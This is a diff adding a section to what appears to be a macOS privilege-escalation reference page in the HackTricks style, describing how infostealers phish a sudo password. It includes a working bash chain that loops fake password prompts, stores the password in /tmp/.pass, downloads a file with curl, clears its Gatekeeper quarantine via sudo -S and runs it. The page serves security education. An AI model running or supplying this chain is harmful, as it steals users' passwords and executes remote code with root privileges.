@@ -209,6 +209,29 @@ killall Dock
 {{#endtab}}
 {{#endtabs}}
 
+### Password prompt phishing + sudo reuse
+
+Malware frequently abuses user interaction to **capture a sudo-capable password** and reuse it programmatically. A common flow:
+
+1. Identify the logged in user with `whoami`.
+2. **Loop password prompts** until `dscl . -authonly "$user" "$pw"` returns success.
+3. Cache the credential (e.g., `/tmp/.pass`) and drive privileged actions with `sudo -S` (password over stdin).
+
+Example minimal chain:
+
+```bash
+user=$(whoami)
+while true; do
+  read -s -p "Password: " pw; echo
+  dscl . -authonly "$user" "$pw" && break
+done
+printf '%s\n' "$pw" > /tmp/.pass
+curl -o /tmp/update https://example.com/update
+printf '%s\n' "$pw" | sudo -S xattr -c /tmp/update && chmod +x /tmp/update && /tmp/update
+```
+
+The stolen password can then be reused to **clear Gatekeeper quarantine with `xattr -c`**, copy LaunchDaemons or other privileged files, and run additional stages non-interactively.
+
 ## TCC - Root Privilege Escalation
 
 ### CVE-2020-9771 - mount_apfs TCC bypass and privilege escalation
@@ -246,6 +269,10 @@ This can be useful to escalate privileges:
 {{#ref}}
 macos-files-folders-and-binaries/macos-sensitive-locations.md
 {{#endref}}
+
+## References
+
+- [2025, the year of the Infostealer](https://www.pentestpartners.com/security-blog/2025-the-year-of-the-infostealer/)
 
 {{#include ../../banners/hacktricks-training.md}}
 
